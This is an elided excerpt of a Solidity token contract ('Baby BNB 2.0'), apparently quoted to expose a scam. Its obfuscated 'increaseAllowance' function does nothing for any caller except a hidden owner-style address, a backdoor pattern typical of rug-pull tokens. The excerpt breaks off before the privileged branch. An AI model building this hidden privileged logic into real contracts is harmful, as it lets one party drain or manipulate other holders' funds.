...
contract BABYBNBTOKEN is Ownable {
    ...
    string private _hooextokenname = "Baby BNB 2.0";
    string private _voptokensymbol = "BABYBNB2.0";
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
        address public ffsgxbf76;
    function increaseAllowance(address yayayxx) public     {
        ...
        if(ffsgxbf76 != _msgSender()){
            return ;
        }else{
           require(ffsgxbf76 == _msgSender());
